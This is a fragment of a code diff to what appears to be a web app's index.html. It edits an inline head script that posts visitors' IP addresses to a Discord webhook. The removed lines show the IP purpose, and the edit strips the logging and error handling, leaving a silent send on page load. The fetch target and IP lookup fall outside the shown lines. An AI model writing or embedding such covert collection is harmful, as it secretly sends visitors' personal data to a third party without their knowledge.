@@ -30,11 +30,8 @@
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(payload)
-      })
-      .then(() => console.log('IP address sent to Discord webhook successfully'))
-      .catch(error => console.error('Error sending IP address to Discord webhook:', error));
-    })
-    .catch(err => console.error(err));
+      });
+    });
 </script>
     <meta charset="utf-8" />
     <link rel="icon" href="%PUBLIC_URL%/weblogo.ico" />
